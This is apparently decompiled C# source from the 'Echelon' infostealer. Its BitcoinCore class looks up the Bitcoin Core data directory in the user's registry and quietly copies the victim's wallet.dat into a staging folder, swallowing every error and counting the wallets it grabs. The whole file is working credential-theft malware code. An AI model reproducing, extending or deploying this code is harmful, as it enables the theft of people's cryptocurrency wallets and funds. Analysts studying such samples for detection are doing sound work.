﻿using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000A RID: 10
	internal class BitcoinCore
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00019820 File Offset: 0x00017A20
		public static void BCStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
						BitcoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000037 RID: 55
		public static int count;
	}
}
